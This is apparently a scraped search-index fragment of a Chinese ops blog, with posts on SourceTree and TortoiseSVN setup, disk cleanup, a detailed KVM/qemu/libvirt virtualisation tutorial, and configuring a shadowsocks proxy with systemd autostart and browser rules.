\u0026quot;IsDefault\u0026quot;: false } ] 打开 %LocalAppData%\\Atlassian，进入SourceTree.exe_Url_iayhtc13zv3obzuz5vchezjs1az2q5ef（注该目录可能和版本相关，不同版本的路径可能不完全一样。）\n编辑user.config,在第四行下面插入如下配置.\n\u0026lt;setting name=\u0026quot;AgreedToEULA\u0026quot; serializeAs=\u0026quot;String\u0026quot;\u0026gt; \u0026lt;value\u0026gt;True\u0026lt;/value\u0026gt; \u0026lt;/setting\u0026gt; \u0026lt;setting name=\u0026quot;AgreedToEULAVersion\u0026quot; serializeAs=\u0026quot;String\u0026quot;\u0026gt; \u0026lt;value\u0026gt;20160201\u0026lt;/value\u0026gt; \u0026lt;/setting\u0026gt; 进sourcetree页面，开启仓库克隆及拉取操作，Mecurial插件可以按需安装(一般选择不安装)。用Git可以跳过。\n进入sourcetree后,点击clone，添加仓库\nurl: http://139.224.43.8:88/qianxiang/web.git #git仓库名称路径 path：E:\\source_code\\qianxiang\\web #存放本地的磁盘位置如 #点击构建即可 分支管理(已经习惯feature_date_projectID起来)。\nGit工作流中，将\u0026quot;/\u0026quot; ---\u0026gt; \u0026quot;_\u0026quot; feature/ ---\u0026gt; feature_ release/ ---\u0026gt; release_ hotfix/ ---\u0026gt; hotfix_ 用git命令行模式管理分支\ngit pull git checkout release_1000252_08241100\t#切换分支 合并分支并查询差异，告知相关负责人。\n五、TortoiseSVN安装 官网下载：https://tortoisesvn.net/downloads.html\n一直点击下一步，直到安装完成，安装TortoiseSVN并没有管理界面，但当你鼠标右击的时候，会多出SVN Checkout…和TortoiseSVN这两个选项。\n简单配置\n点击“SVN Checkout”后弹出对话框， URL of repository填写你的公司或组织给你的svn地址， Checkout directory:设置要将svn上的文件下载到本地的存储路径， 点击ok ","permalink":"https://www.fenghong.tech/blog/2018/2018-09-05-opsenv/","tags":["Linux","Navicat","git","sourcetree","xshell"],"title":"运维桌面软件应用安装"},{"categories":["ops"],"contents":"磁盘利用率100%问题解决 df -h 查看磁盘占用率100% 分析相关问题 1. df -i查看inode号是否占用，一般情况不会占用。 2. cd / \u0026amp;\u0026amp; du -h --max-depth=1 ,查看根目录文件大小 是否是磁盘大小。是的话选中3，否的话选择4. 3. lsof |grep deleted 查看释放空间，发现jenkins占用16G,kill -9 jenkis对应的pid,重启jenkins。 4. find / -size +100M -exec ls -lh {} \\; 查询根目录下大于100M文件，并列出来。按不需删除。 这次真实的原因是因为磁盘中比较大并且以有在使用的数据，但是在删除的时候使用的是rm命令直接删除 ","permalink":"https://www.fenghong.tech/blog/2018/2018-08-01-manage-disk/","tags":["Linux","disk","find"],"title":"磁盘清理"},{"categories":["ops"],"contents":"摘要：\n 虚拟化技术 KVM： Kernel-based Virtual Machine qemu-kvm管理 libvirt工具管理  虚拟化技术  第一代：真空管，穿孔卡片\n第二代：晶体管，批处理系统\n第三代：集成电路，多道程序设计\n  第四代：PC\n 虚拟化要求 Poke, Glodberg 提出虚拟化的三要素 等价执行 性能良好 安全隔离  CPU虚拟化  emulation 模拟r0-r3\t---60% virtulization\t模拟r0 完全虚拟化（full-virtulazition） BT：binary translation 二进制翻译（软件上） ----85% HVM：硬件辅助虚拟化 半虚拟化（para-virtulation） ---必须修改cpu内核，才可以实现半虚拟化 ---95% 各Guest的主机明确知道Host主机的存在 vm monitor == hypeivisor ----hyper call特权指令的调用  HVM  cpu有5个环，比传统的多一个环。 r-1 -----Host 主机内核上的特权指令 r 0 r 1 r 2 r 3 -----Guest 用户空间  Memory的虚拟  进程：线性地址空间 内核：物理地址空间 Guest 的虚拟内存必须是连续的，但是hypervisor给其分配的物理内存分散的 shadow page table tlb缓存命中率低下 mmu虚拟化：GVA---GPA，同步进行GVA---HPA intel：EPT，Extended page table AMD:NTP,Nested Page Table GVA：guest virtul address GPA：guest visible address HPA：hypervisor visible address TLB 虚拟化 tagged TLB ----\u0026gt; 直接缓存GVA---HPA记录，命中率大大提高 I/O 外存 硬盘/光盘/U盘 网络设备 网卡 显示设备 VGA：frame buffer机制，由于存在硬件加速，显卡虚拟效果不佳 键盘鼠标 PS/2，usb I/O的虚拟化方式： 模拟：使用软件模拟真实硬件 在Guest也存在调用设备，然后在hypervisor上存在 IO stack，继续调用。 半虚拟化：和CPU半虚拟化类似 IO frontend ----\u0026gt; IO backend I/O-through：I/O透传技术 guest直接访问真实的I/O设备----VT-d+IOV技术 Intel: VT-d IOmmu技术 基于北桥的硬件辅助的虚拟化技术  两种技术实现方式  Type—I型 硬件上安装hypervisor xens，vmware ESX/ESXi Type-II型 硬件上安装hosts kvm，virtualbox，vmware workstation 总结  Interl硬件辅助的虚拟化  cpu：vt-x,EPT,tagged-TLB IO/CPU:vt-d,vt-x,IOV,VMDq 处理器相关：vt-x 芯片相关：vt-d IO相关：SR-IOV，VMDq  虚拟化技术  模拟：著名的模拟器，Pearpc，Bochs，QEMU 上层-------guest 上层-------emulation 上层-------hosts 底层-------硬件 完全虚拟化 native virtulizition 加速方式：BT，HVM VMware Workstation,VMware Server，Parallels Desktop，KVM,Xens(HVM) 半虚拟化:para-virtulizition 上层---------guest（需要修改内核参数） 上层---------hypercisor，hyper call 底层---------硬件 xen,uml(user-mode linux) OS级别虚拟化： 上层---------用户空间，虚拟管理器 上层---------内核 底层---------硬件 OpenVZ，lxc，Solris Containers，FreeBSd jails 库虚拟化： wine， 如在ubuntu上安装qq，魔兽等windows。 应用程序虚拟化： jvm，  虚拟化网络  桥接 hsots上的网卡，可以看成一个交换机设备。各虚拟机和hosts处于等同地位 路由模型 hosts软件虚拟一网卡，仅主机 nat hosts软件虚拟化一个网卡。将guset元ip地址改为hosts的ip地址。  tun与tap  在计算机网络中，TUN与TAP是操作系统内核中的虚拟网络设备，不同于普通依赖硬件网路板卡实现的设备。 TAP等同于一个以太网设备，操作第二层数据包如以太网数据帧。 TUN模拟了网络层设备，操作第三层数据包如IP数据包。 操作系统通过TUN/TAP设备向绑定该设备的用户空间的程序发送数据， 反之，用户空间程序也可以像操作硬件网络设备一样，通过TUN/TAP设备发送数据。 TUN/TAP设备宝贝向操作系统的网络栈发送投递数据包，从而模拟从外部接受数据的过程。  安装创建桥服务，重启会丢失数据。建议写成脚本。  $ chkconfig disable NetworkManager $ chkconfig enable network $ yum install bridge-utils -y $ brctl addbr br0 $ ifconfig eth0 0 up $ brctl addif br0 eth0 $ ifconfig br0 172.20.0.24/16 up $ route add default gw 172.20.0.1 KVM KVM：Kernel-based Virtual Machine,以色列Qumranet公司开发，2009年被redhat收购\nqemu：创建并管理虚拟机的工具，额外实现模拟I/O的工具。\n\t将guest的内核空间转移---r1上 $ modprobe kvm $ lsmod |grep kvm kvm_intel 204800 0 kvm 593920 1 kvm_intel irqbypass 16384 1 kvm $ ll /dev/kvm crw------- 1 root root 10, 232 jul 26 09:35 /dev/kvm  KVM组件  /dev/kvm: 管理虚拟机的设备文件 创建虚拟机 为虚拟机分配内存 读写VCPU的寄存器 向VCPU注入中断 运行VCPU qemu进程：工作与用户空间的组建，用于仿真PC机的I/O类硬件设备。  virt  $ yum list *virt* #redhat安装kvm的虚拟库，如果要安装zens，则需要用到zen的库 $ yum info qemu-kvm qemu-kvm-tools $ yum install -y qemu-kvm qemu-kvm-tools $ ln -sv /usr/libexec/qemu-kvm /usr/sbin/ #软链接一个，没有PATH变量 qemu-kvm的用法  标准选项  qemu-kvm的标准选项主要涉及指定主机类型、CPU模式、NUMA、软驱设备、光驱设备及硬件设备等。 -name name：设定虚拟机名称； -M machine：指定要模拟的主机类型，如Standard PC、ISA-only PC或Intel-Mac等，可以使用“qemu-kvm -M ?”获取所支持的所有类型； -m megs：设定虚拟机的RAM大小； -cpu model：设定CPU模型，如coreduo、qemu64等，可以使用“qemu-kvm -cpu ?”获取所支持的所有模型； -smp n[,cores=cores][,threads=threads][,sockets=sockets][,maxcpus=maxcpus]：设定模拟的SMP架构中CPU的个数等、每个CPU的核心数及CPU的socket数目等；PC机上最多可以模拟255颗CPU；maxcpus用于指定热插入的CPU个数上限； -numa opts：指定模拟多节点的numa设备； -fda file -fdb file：使用指定文件(file)作为软盘镜像，file为/dev/fd0表示使用物理软驱； -hda file -hdb file -hdc file -hdd file：使用指定file作为硬盘镜像； -cdrom file：使用指定file作为CD-ROM镜像，需要注意的是-cdrom和-hdc不能同时使用；将file指定为/dev/cdrom可以直接使用物理光驱； -drive option[,option[,option[,...]]]：定义一个新的硬盘设备；可用子选项有很多。 file=/path/to/somefile：硬件映像文件路径； if=interface：指定硬盘设备所连接的接口类型，即控制器类型，如ide、scsi、sd、mtd、floppy、pflash及virtio等； index=index：设定同一种控制器类型中不同设备的索引号，即标识号； media=media：定义介质类型为硬盘(disk)还是光盘(cdrom)； snapshot=snapshot：指定当前硬盘设备是否支持快照功能：on或off； cache=cache：定义如何使用物理机缓存来访问块数据，其可用值有none、writeback、unsafe和writethrough四个； format=format：指定映像文件的格式，具体格式可参见qemu-img命令； -boot [order=drives][,once=drives][,menu=on|off]：定义启动设备的引导次序，每种设备使用一个字符表示；不同的架构所支持的设备及其表示字符不尽相同，在x86 PC架构上，a、b表示软驱、c表示第一块硬盘，d表示第一个光驱设备，n-p表示网络适配器；默认为硬盘设备；  显示选项  显示选项用于定义虚拟机启动后的显示接口相关类型及属性等。 -nographic：默认情况下，qemu使用SDL来显示VGA输出；而此选项用于禁止图形接口，此时,qemu类似一个简单的命令行程序，其仿真串口设备将被重定向到控制台； -curses：禁止图形接口，并使用curses/ncurses作为交互接口； -alt-grab：使用Ctrl+Alt+Shift组合键释放鼠标； -ctrl-grab：使用右Ctrl键释放鼠标； -sdl：启用SDL； -spice option[,option[,...]]：启用spice远程桌面协议；其有许多子选项，具体请参照qemu-kvm的手册； -vga type：指定要仿真的VGA接口类型，常见类型有： cirrus：Cirrus Logic GD5446显示卡； std：带有Bochs VBI扩展的标准VGA显示卡； vmware：VMWare SVGA-II兼容的显示适配器； qxl：QXL半虚拟化显示卡；与VGA兼容；在Guest中安装qxl驱动后能以很好的方式工作，在使用spice协议时推荐使用此类型； none：禁用VGA卡； -vnc display[,option[,option[,...]]]：默认情况下，qemu使用SDL显示VGA输出；使用-vnc选项，可以让qemu监听在VNC上，并将VGA输出重定向至VNC会话；使用此选项时，必须使用-k选项指定键盘布局类型；其有许多子选项，具体请参照qemu-kvm的手册；  网络选项  网络属性相关选项用于定义网络设备接口类型及其相关的各属性等信息。这里只介绍nic、tap和user三种类型网络接口的属性，其它类型请参照qemu-kvm手册。 -net nic[,vlan=n][,macaddr=mac][,model=type][,name=name][,addr=addr][,vectors=v]：创建一个新的网卡设备并连接至vlan n中；PC架构上默认的NIC为e1000，macaddr用于为其指定MAC地址，name用于指定一个在监控时显示的网上设备名称；emu可以模拟多个类型的网卡设备，如virtio、i82551、i82557b、i82559er、ne2k_isa、pcnet、rtl8139、e1000、smc91c111、lance及mcf_fec等；不过，不同平台架构上，其支持的类型可能只包含前述列表的一部分，可以使用“qemu-kvm -net nic,mode=?”来获取当前平台支持的类型； -net tap[,vlan=n][,name=name][,fd=h][,ifname=name][,script=file][,downscript=dfile]：通过物理机的TAP网络接口连接至vlan n中，使用script=file指定的脚本(默认为/etc/qemu-ifup)来配置当前网络接口，并使用downscript=file指定的脚本(默认为/etc/qemu-ifdown)来撤消接口配置；使用script=no和downscript=no可分别用来禁止执行脚本； -net user[,option][,option][,...]：在用户模式配置网络栈，其不依赖于管理权限；有效选项有： vlan=n：连接至vlan n，默认n=0； name=name：指定接口的显示名称，常用于监控模式中； net=addr[/mask]：设定GuestOS可见的IP网络，掩码可选，默认为10.0.2.0/8； host=addr：指定GuestOS中看到的物理机的IP地址，默认为指定网络中的第二个，即x.x.x.2； dhcpstart=addr：指定DHCP服务地址池中16个地址的起始IP，默认为第16个至第31个，即x.x.x.16-x.x.x.31； dns=addr：指定GuestOS可见的dns服务器地址；默认为GuestOS网络中的第三个地址，即x.x.x.3； tftp=dir：激活内置的tftp服务器，并使用指定的dir作为tftp服务器的默认根目录； bootfile=file：BOOTP文件名称，用于实现网络引导GuestOS；如：qemu -hda linux.img -boot n -net user,tftp=/tftpserver/pub,bootfile=/pxelinux.0  一个例子  下面的命令创建了一个名为rhel7.5的虚拟机，其RAM大小为512MB，有两颗CPU的SMP架构，默认引导设备为硬盘，有一个硬盘设备和一个光驱设备，网络接口类型为virtio，VGA模式为cirrus，并启用了balloon功能。 $ qemu-kvm -name \u0026quot;rhel7.5\u0026quot; -m 512 \\ -smp 2 -boot d \\ -drive file=/VM/images/rhel7.5/hda,if=virtio,index=0,media=disk,format=qcow2 \\ -drive file=/isos/rhel-7.5.iso,index=1,media=cdrom \\ -net nic,model=virtio,macaddr=52:54:00:A5:41:1E \\ -vga cirrus -balloon virtio qemu-img命令使用 选项\n#create 创建 #resize 增加大小 #convert 转化 #snapshot 快照 $ qemu-img --help $ qemu-img create -f qcow2 -o size=20G /images/vm1/c1.qcow2 $ qemu-img conver -O vmdk -o adapter_type=lsilogic c1.qcow2 c1.vmdk $ qemu-img snapshot -c c1.snap c1.qcow2  安装虚拟机实验  下载iso镜像 $ modprobe kvm $ modprobe kvm_intel $ mkdir /images/vml -pv $ qemu-img create -f qcow2 -o size=40G /images/vml/ubuntu.qcow2 $ qemu-img resize /images/vml/ubuntu.qcow2 50G $ ls -lh /images/vml/ubuntu.qcow2 $ yum install -y tigervnc #安装vnc客户端 #had模式 $ qemu-kvm -name 'ubuntu' -m 768 -smp 4 -hda /images/vml/ubuntu.qcow2 \\ -cdrom ubuntu-16.10-desktop-amd64.iso -boot order=dc #前台运行的 $ vncviewer ：5900 进行安装界面 #drive模式 $ qemu-kvm -name 'win7' -m 768 -smp 4 -drive \\ file=/images/vml/ubuntu.qcow2,if=ide,index=0,media=disk,format=qcow2 \\ -drive file=/root/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso,\\ media=cdrom,index=1 -boot order=dc  qemu-KVM其他可能用到的选项  #在monitor下实现实时迁移：-incoming tcp:0:port #qemu-kvm运行后台：-daemonize #打开声音设备：-soundhw #设定iscsi存储设备 # qemu-kvm -iscsi initiator-name= -drive \\ file=iscsi://\u0026lt;ip\u0026gt;[:port]/\u0026lt;target_iqn\u0026gt;/\u0026lt;lun\u0026gt; #设定bios： -bios /path/to/some_bios_program KVM-libvirt 基于C/S架构，virsh，virt-manager，virt-install，virt-clone，virt-convert，virt-copy等管理工具，使用原始的qemu-kvm管理过于繁琐，命令行复杂。需要对很多选项熟悉才能玩得转。\n 前期环境准备  $ yum install -y libvirt libvirt-daemon-kvm qemu-kvm virt-manager $ systemctl start libvirtd.service #######创建br0容易发生错误########### ###ens37为桥接网卡，且获取ip为dhcp方式### $ virsh iface-bridge ens37 br1 || systemctl restart network $ virt-install -n \u0026quot;centos6\u0026quot; --vcpus 2 -r 512 \\ -l http://172.20.0.1/cobbler/ks_centsos6.9 \\ --disk path=/images/vm/centos6.qcow2,bus=virtio,size=120,sparse --network bridge=br0,model=virtio --force $ virt-manager \u0026amp; virt-install是一个命令行工具，它能够为KVM、Xen或其它支持libvrit API的hypervisor创建虚拟机并完成GuestOS安装；此外，它能够基于串行控制台、VNC或SDL支持文本或图形安装界面。安装过程可以使用本地的安装介质如CDROM，也可以通过网络方式如NFS、HTTP或FTP服务实现。对于通过网络安装的方式，virt-install可以自动加载必要的文件以启动安装过程而无须额外提供引导工具。当然，virt-install也支持PXE方式的安装过程，也能够直接使用现有的磁盘映像直接启动安装过程。\nvirt-install命令有许多选项，这些选项大体可分为下面几大类，同时对每类中的常用选项也做出简单说明。 一般选项：指定虚拟机的名称、内存大小、VCPU个数及特性等； -n NAME, --name=NAME：虚拟机名称，需全局惟一； -r MEMORY, --ram=MEMORY：虚拟机内在大小，单位为MB； --vcpus=VCPUS[,maxvcpus=MAX][,sockets=#][,cores=#][,threads=#]：VCPU个数及相关配置； --cpu=CPU：CPU模式及特性，如coreduo等；可以使用qemu-kvm -cpu ?来获取支持的CPU模式； 安装方法：指定安装方法、GuestOS类型等； -c CDROM, --cdrom=CDROM：光盘安装介质； -l LOCATION, --location=LOCATION：安装源URL，支持FTP、HTTP及NFS等，如ftp://172.16.0.1/pub； --pxe：基于PXE完成安装； --livecd: 把光盘当作LiveCD； --os-type=DISTRO_TYPE：操作系统类型，如linux、unix或windows等； --os-variant=DISTRO_VARIANT：某类型操作系统的变体，如rhel5、fedora8等； -x EXTRA, --extra-args=EXTRA：根据--location指定的方式安装GuestOS时，用于传递给内核的额外选项，例如指定kickstart文件的位置，--extra-args \u0026quot;ks=http://172.16.0.1/class.cfg\u0026quot; --boot=BOOTOPTS：指定安装过程完成后的配置选项，如指定引导设备次序、使用指定的而非安装的kernel/initrd来引导系统启动等 ；例如： --boot cdrom,hd,network：指定引导次序； --boot kernel=KERNEL,initrd=INITRD,kernel_args=”console=/dev/ttyS0”：指定启动系统的内核及initrd文件； 存储配置：指定存储类型、位置及属性等； --disk=DISKOPTS：指定存储设备及其属性；格式为--disk /some/storage/path,opt1=val1，opt2=val2等；常用的选项有： device：设备类型，如cdrom、disk或floppy等，默认为disk； bus：磁盘总结类型，其值可以为ide、scsi、usb、virtio或xen； perms：访问权限，如rw、ro或sh（共享的可读写），默认为rw； size：新建磁盘映像的大小，单位为GB； cache：缓存模型，其值有none、writethrouth（缓存读）及writeback（缓存读写）； format：磁盘映像格式，如raw、qcow2、vmdk等； sparse：磁盘映像使用稀疏格式，即不立即分配指定大小的空间； --nodisks：不使用本地磁盘，在LiveCD模式中常用； 网络配置：指定网络接口的网络类型及接口属性如MAC地址、驱动模式等； -w NETWORK, --network=NETWORK,opt1=val1,opt2=val2：将虚拟机连入宿主机的网络中，其中NETWORK可以为： bridge=BRIDGE：连接至名为“BRIDEG”的桥设备； network=NAME：连接至名为“NAME”的网络； 它常用的选项还有： model：GuestOS中看到的网络设备型号，如e1000、rtl8139或virtio等； mac：固定的MAC地址；省略此选项时将使用随机地址，但无论何种方式，对于KVM来说，其前三段必须为52:54:00； --nonetworks：虚拟机不使用网络功能； 图形配置：定义虚拟机显示功能相关的配置，如VNC相关配置； --graphics TYPE,opt1=val1,opt2=val2：指定图形显示相关的配置，此选项不会配置任何显示硬件（如显卡），而是仅指定虚拟机启动后对其进行访问的接口； TYPE：指定显示类型，可以为vnc、sdl、spice或none等，默认为vnc； port：TYPE为vnc或spice时其监听的端口； listen：TYPE为vnc或spice时所监听的IP地址，默认为127.0.0.1，可以通过修改/etc/libvirt/qemu.conf定义新的默认值； password：TYPE为vnc或spice时，为远程访问监听的服务进指定认证密码； --noautoconsole：禁止自动连接至虚拟机的控制台； 设备选项：指定文本控制台、声音设备、串行接口、并行接口、显示接口等； --serial=CHAROPTS：附加一个串行设备至当前虚拟机，根据设备类型的不同，可以使用不同的选项，格式为“--serial type,opt1=val1,opt2=val2,...”，例如： --serial pty：创建伪终端； --serial dev,path=HOSTPATH：附加主机设备至此虚拟机； --video=VIDEO：指定显卡设备模型，可用取值为cirrus、vga、qxl或vmvga； 虚拟化平台：虚拟化模型（hvm或paravirt）、模拟的CPU平台类型、模拟的主机类型、hypervisor类型（如kvm、xen或qemu等）以及当前虚拟机的UUID等； -v, --hvm：当物理机同时支持完全虚拟化和半虚拟化时，指定使用完全虚拟化； -p, --paravirt：指定使用半虚拟化； --virt-type：使用的hypervisor，如kvm、qemu、xen等；所有可用值可以使用’virsh capabilities’命令获取； 其它： --autostart：指定虚拟机是否在物理启动后自动启动； --print-xml：如果虚拟机不需要安装过程(--import、--boot)，则显示生成的XML而不是创建此虚拟机；默认情况下，此选项仍会创建磁盘映像； --force：禁止命令进入交互式模式，如果有需要回答yes或no选项，则自动回答为yes； --dry-run：执行创建虚拟机的整个过程，但不真正创建虚拟机、改变主机上的设备配置信息及将其创建的需求通知给libvirt； -d, --debug：显示debug信息； 尽管virt-install命令有着类似上述的众多选项，但实际使用中，其必须提供的选项仅包括--name、--ram、--disk（也可是--nodisks）及安装过程相关的选项。此外，有时还需要使用括--connect=CONNCT选项来指定连接至一个非默认的hypervisor。  一个例子  下面的示例将创建一个名为rhel6的虚拟机，其有两个虚拟CPU，安装方法为FTP，并指定了ks文件的位置，磁盘映像文件为稀疏格式，连接至物理主机上的名为brnet0的桥接网络： $ virt-install \\ --connect qemu:///system \\ --virt-type kvm \\ --name rhel6 \\ --ram 1024 \\ --vcpus 2 \\ --network bridge=brnet0 \\ --disk path=/VMs/images/rhel6.img,size=120,sparse \\ --location ftp://172.16.0.1/rhel6/dvd \\ --extra_args “ks=http://172.16.0.1/rhel6.cfg” \\ --os-variant rhel6 \\ --force  img安装  $ mv cirros-no_cloud-0.3.0-x86_64-disk.img c1.img [root@master ~]# qemu-img info c1.img file format: qcow2 virtual size: 39M (41126400 bytes) disk size: 11M cluster_size: 65536 Format specific information: compat: 0.10 $ virt-manager \u0026amp; #采用import镜像文件方法，第四项进行图形安装。 $ virsh list Id Name State ---------------------------------------------------- 2 centos6.9 running $ virsh Welcome to virsh, the virtualization interactive terminal. Type: 'help' for help with commands 'quit' to quit virsh # console centos6.9 Connected to domain centos6.9 Escape character is ^] login as 'mageedu' user. default password: 'mageedu.com'. use 'sudo' for root. cirros login: mageedu Password: $ sudo su - # ls #### ctrl+] 退出终端 #### virsh # help domain #虚拟机管理 virsh # domstats centos6.9 Domain: 'centos6.9' state.state=1 state.reason=1 cpu.time=16312974545 cpu.user=1730000000 ···· ------管理虚拟机domain------ $ virsh list $ virsh start c2 $ virsh destroy c2 $ virsh reboot c2 $ virsh undefine c2 $ virsh save c2 /tmp/c2.sanp $ virsh restore /tmp/c2.sanp ----hypervisor---- $ virsh nodeinfo $ virsh capabilities ----Interface----- #管理hypervisor的网络iface ----Networking---- #管理guest的网络 ----Storage Pool---- #存储池管理 配置文件/etc/libvirt/qemu/centos6.9.xml,修改部分内容即可复制新虚拟机.\n$ cp /etc/libvirt/qemu/centos6.9.xml /etc/libvirt/qemu/c2.xml $ vim /etc/libvirt/qemu/c2.xml ###将centos6.9替换成c2，uuid,source的path等修改即可 ##准备qcow2及img文件 $ qemu-img create -f qcow2 -o size=40G /images/vml/c2.qcow2 $ mv cirros-no_cloud-0.3.0-x86_64-disk.img c2.img #创建虚拟机并进入终端。 $ virsh create --console /etc/libvirt/qemu/c2.xml 批量创建虚拟机 当然，如果批量创建虚拟机机，上面的操作依然繁琐，这里推荐一个脚本复制，时间会稍长。\nfor i in {1..30}; do virt-clone --connect=qemu:///system -o temp -n node$i -f /data/node$i.img done 当然，也有批量删除的.\nfor i in {1..30}; do do virsh undefine node$i done 这里，每个虚拟机都有相应的ip,桥接的网卡是172.20/16网段的。要求能获取每个虚拟机的Ip,这里推荐一个脚本获取，当然，需要相应主机是running状态的。\n$ vim vish.sh #!/bin/bash #ping当前网段内在线的主机,以便产生arp记录. for ip in 172.20.128.{1..253};do { ping -c1 $ip \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 }\u0026amp; done #依次查找arp记录. running_vms=`virsh list |grep running` echo -ne \u0026quot;共有`echo \u0026quot;$running_vms\u0026quot;|wc -l`个虚拟机在运行.\\n\u0026quot; for i in `echo \u0026quot;$running_vms\u0026quot; | awk '{ print $2 }'`;do mac=`virsh dumpxml $i |grep \u0026quot;mac address\u0026quot;|sed \u0026quot;s/.*'\\(.*\\)'.*/\\1/g\u0026quot;` ip=`arp -ne |grep \u0026quot;$mac\u0026quot; |awk '{printf $1}'` printf \u0026quot;%-30s %-30s\\n\u0026quot; $i $ip done $ chmod +x virsh.sh $ ./virt.sh 共有31个虚拟机在运行. ubuntu16.04 172.20.128.166 node1 172.20.128.201 node2 172.20.128.202 node3 172.20.128.203 node4 172.20.128.204 node5 172.20.128.205 node6 172.20.128.206 node7 172.20.128.207 node8 172.20.128.208 node9 172.20.128.209 node10 172.20.128.210 node11 172.20.128.211 node12 172.20.128.212 node13 172.20.128.213 node14 172.20.128.215 node15 172.20.128.214 node16 172.20.128.217 node17 172.20.128.216 node18 172.20.128.218 node19 172.20.128.219 node20 172.20.128.220 node21 172.20.128.222 node22 172.20.128.221 node23 172.20.128.224 node24 172.20.128.229 node25 172.20.128.227 node26 172.20.128.225 node27 172.20.128.223 node28 172.20.128.226 node29 172.20.128.230 node30 172.20.128.228 ","permalink":"https://www.fenghong.tech/blog/2018/2018-07-26-kvm/","tags":["Linux","virtul"],"title":"Kvm初探"},{"categories":["ops"],"contents":"摘要：\n 科学上网 lxc容器  系统：Kubuntu 18.04 X86_64\n一键恢复 重装了一次系统或者重装chrome，发现Proxy SwitchyOmega这个软件的配置没有自动保存功能，比较尴尬，只能重新导入，这边只好保存了一下自己的配置文件，安装好Proxy SwitchyOmega,选择import/Export \u0026mdash;-\u0026gt; Restore from online;我这边保存在自己的阿里云上了，路径如下\nhttps://www.fenghong.tech/OmegaOptions.bak 科学上网  安装代理  安装shadowsocks,这里不要用系统自带的sudo apt install shadowsocks,下载的不是最新的，不支持加密选项，会报错，这里博主犯错了，习惯了用vim编辑，所以这里我推荐使用。\n$ sudo apt-get install python-pip -y $ sudo apt-get install git -y $ pip install git+https://github.com/shadowsocks/shadowsocks.git@master $ sudo apt-get install vim -y #下载的shadowsocks是最新版，在/home/$user/.local/bin/{ssserver,sslocal} $ sudo echo \u0026quot;export PATH=/home/feng/.local/bin:$PATH\u0026quot; \u0026gt; /etc/profile.d/ss.sh $ . /etc/profile.d/ss.sh $ echo $PATH /home/feng/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin #已经在环境变量里面，所以可以直接运行。  配置文件创建  $ sudo vim /etc/shadowsocks.json { \u0026quot;server\u0026quot;: \u0026quot;serverip\u0026quot;, \u0026quot;server_port\u0026quot;: port, \u0026quot;local_address\u0026quot;: \u0026quot;127.0.0.1\u0026quot;, \u0026quot;local_port\u0026quot;: 1080, \u0026quot;timeout\u0026quot;:300, \u0026quot;password\u0026quot;: \u0026quot;password\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;aes-256-cfb\u0026quot;, \u0026quot;fast_open\u0026quot;:false }  启动  $ sudo sslocal -c /etc/shadowsocks.json -d start #sslocal -h 查看帮助 -c CONFIG path to config file -s SERVER_ADDR server address -p SERVER_PORT server port, default: 8388 -b LOCAL_ADDR local binding address, default: 127.0.0.1 -l LOCAL_PORT local port, default: 1080 -k PASSWORD password -m METHOD encryption method, default: aes-256-cfb 默认开机启动 ubuntu18.04默认是systemd管理启动\n以前启动mysql服务:\nsudo service mysqld start 现在：\nsudo systemctl start mariadb.service systemd 默认读取 /etc/systemd/system 下的配置文件，该目录下的文件会链接/lib/systemd/system/下的文件。\n执行 ls /lib/systemd/system 你可以看到有很多启动脚本，其中就有我们需要的 rc.local.service：\n$ cat /lib/systemd/system/rc.local.service # SPDX-License-Identifier: LGPL-2.1+ # # This file is part of systemd. # # systemd is free software; you can redistribute it and/or modify it # under the terms of the GNU Lesser General Public License as published by # the Free Software Foundation; either version 2.1 of the License, or # (at your option) any later version. # This unit gets pulled automatically into multi-user.target by # systemd-rc-local-generator if /etc/rc.local is executable. [Unit] Description=/etc/rc.local Compatibility Documentation=man:systemd-rc-local-generator(8) ConditionFileIsExecutable=/etc/rc.local After=network.target [Service] Type=forking ExecStart=/etc/rc.local start TimeoutSec=0 RemainAfterExit=yes GuessMainPID=no  正常启动文件   [Unit] 段: 启动顺序与依赖关系\n[Service] 段: 启动行为,如何启动，启动类型\n[Install] 段: 定义如何安装这个配置文件，即怎样做到开机启动\n 可以看出，/etc/rc.local 的启动顺序是在网络后面，但是显然它少了 Install 段，也就没有定义如何做到开机启动，所以显然这样配置是无效的。 因此我们就需要在后面帮他加上 [Install] 段:\n[Install] WantedBy=multi-user.target Alias=rc-local.service 这里需要注意一下，ubuntu-18.04 默认是没有 /etc/rc.local 这个文件的，需要自己创建\n$ sudo touch /etc/rc.local 然后把你需要启动脚本写入 /etc/rc.local ，我们不妨写一些测试的脚本放在里面，以便验证脚本是否生效.\n 创建开机启动的软链接,这点也比较关键，systemd 默认读取 /etc/systemd/system 下的配置文件, 所以还需要在 /etc/systemd/system 目录下创建软链接  ln -s /lib/systemd/system/rc.local.service /etc/systemd/system/  开机自动启动shadowsocks  $ sudo vim /etc/rc.local home/feng/.local/bin/sslocal -c /etc/shadowsocks.json -d start  tips，如果上述操作不成功，可以尝试手工启动  $ vim ss.sh #!/bin/bash /usr/bin/sudo $HOME/.local/bin/sslocal -c /etc/shadowsocks.json -d start $ chmod +x ss.sh $ ./ss.sh 输入秘密即可开启 fixfox代理设置  打开firefox浏览器，添加Proxy SwitchyOmega  1.在浏览器里输入about:addons 2.在 Search on addons.mozilla.org里输入 Proxy SwitchyOmega 3.点击Add添加后，有浏览器告诉你如何安装  设置Proxy  #点击已经添加的Proxy SwitchyOmega 1.#点击Profiles下的Proxy Scheme Protocol Server Port (default) SOCKS5\t127.0.0.1 1080 2.#点击Profiles下的auto switch 添加 Rule list rules (Any request matching the rule list below) proxy Default Direct Rule List Config Rule List Format Switchy\tAutoProxy #选择AutoProxy Rule List URL\thttps://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt #设置完后，点击Download Profile Now 3.#点击ACTIONS ----Apply changes 至此设置完成  点击firefox，进行访问，在浏览器右上角点击小圆圈选择auto swith,然后访问google吧  $ tail /var/log/shadowsocks.log INFO: loading config from /etc/shadowsocks/config.json 2018-07-25 21:15:49 INFO starting local at 127.0.0.1:1080 2018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:49532 2018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:49536 2018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:49540  chrome代理设置   